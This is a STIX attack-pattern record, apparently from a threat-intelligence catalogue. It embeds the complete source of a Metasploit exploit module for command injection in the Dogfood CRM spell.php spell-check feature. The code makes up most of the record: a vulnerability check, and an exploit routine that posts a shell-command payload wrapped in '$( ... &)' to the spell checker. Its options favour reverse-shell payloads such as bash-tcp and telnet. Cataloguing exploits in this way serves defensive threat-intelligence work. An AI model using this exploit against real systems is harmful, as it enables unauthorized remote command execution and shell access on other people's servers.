{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ceefa0d-4f45-4fbd-8741-ca220fb39389",
    "created": "2024-08-14T17:12:21.220456Z",
    "modified": "2024-08-14T17:12:21.22046Z",
    "name": "Dogfood CRM spell.php Remote Command Execution",
    "description": " This module exploits a previously unpublished vulnerability in the Dogfood CRM mail function which is vulnerable to command injection in the spell check feature.  Because of character restrictions, this exploit works best with the double-reverse telnet payload. This vulnerability was discovered by LSO and affects v2.0.10. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/dogfood_spell_exec.rb",
            "external_id": "dogfood_spell_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://downloads.sourceforge.net/dogfood/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Dogfood CRM spell.php Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a previously unpublished vulnerability in the\n        Dogfood CRM mail function which is vulnerable to command injection\n        in the spell check feature.  Because of character restrictions, this\n        exploit works best with the double-reverse telnet payload. This\n        vulnerability was discovered by LSO and affects v2.0.10.\n      },\n      'Author'         =>\n        [\n          'LSO <lso[at]hushmail.com>', # Exploit module\n          'aushack', # Added check code, QA tested ok 20090303, there are no references (yet).\n        ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '54707' ],\n          [ 'URL', 'http://downloads.sourceforge.net/dogfood/' ],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['unix'], # aushack - removed win, linux -> untested\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'BadChars'    => %q|'\"`|,  # quotes are escaped by PHP's magic_quotes_gpc in a default install\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-03-03'\n      ))\n\n    register_options(\n      [\n        OptString.new('URIPATH',   [ true,  \"The URI of the spell checker\", '/dogfood/mail/spell.php']),\n      ])\n\n  end\n\n  def check\n    res = send_request_raw(\n      {\n        'uri' => normalize_uri(datastore['URIPATH']),\n      }, 1)\n\n    if (res and res.body =~ /Spell Check complete/)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    timeout = 1\n\n    cmd = payload.encoded\n    data = \"data=#{Rex::Text.uri_encode('$( '+ cmd + ' &)x')}\"\n    uri = normalize_uri(datastore['URIPATH'])\n\n    response = send_request_cgi(\n      {\n      'uri' => uri,\n      'method' => \"POST\",\n      'data' => data\n      },\n    timeout)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-03",
    "x_mitre_platforms": [
        "['unix'], # aushack - removed win, linux -> untested"
    ]
}